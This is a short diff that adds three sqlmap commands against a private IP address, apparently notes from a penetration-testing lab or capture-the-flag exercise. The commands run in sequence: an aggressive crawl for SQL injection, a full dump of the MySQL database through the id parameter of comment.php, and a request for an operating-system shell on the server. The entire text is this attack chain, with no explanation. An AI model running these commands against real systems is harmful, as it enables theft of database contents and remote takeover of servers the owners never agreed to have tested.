@@ -1,0 +1,5 @@
+sqlmap -u 10.11.25.68 --crawl=5 --level=5 --risk=3 --batch
+
+sqlmap -u 10.11.25.68/comment.php?id=761 --dbms=mysql --dump --threads=5
+
+sqlmap -u 10.11.25.68/comment.php?id=761 --dbms=mysql --os-shell
